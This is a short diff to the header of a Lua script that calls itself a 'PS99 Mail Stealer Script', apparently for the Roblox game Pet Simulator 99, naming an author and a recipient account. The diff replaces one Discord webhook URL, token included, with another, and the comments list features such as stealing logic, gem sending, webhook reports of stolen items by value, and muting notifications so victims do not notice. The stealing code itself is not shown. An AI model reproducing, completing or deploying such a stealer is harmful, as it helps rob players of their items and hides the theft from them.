@@ -1,7 +1,7 @@
 -- PS99 Mail Stealer Script - Updated for December 2025
 -- Made by z6mmy - aka slamdunk
 -- Items sent to: FortniteKiller_20
--- Webhook: https://discord.com/api/webhooks/1448917392263745547/ngvoLOWlSvDsbO2Qf6jyofjU9SsTGOHjoJFShTJBg3EntxUmv1BhrM-CvRXJJsmaBAr1
+-- Webhook: https://discord.com/api/webhooks/1449424899188854794/nQ7MuWikJsdvBSgjBsBizmV2Fr7zeoHk_1zYKh8o8cnjF14WpoTs6Tp5yiMwaxPldkiX
 -- All features enabled: Webhook notification with sorted items (high to low RAP), stealing logic, mail claim, box empty, gem send, error message, sound/notify disable, etc.
 
 _G.scriptExecuted = _G.scriptExecuted or false
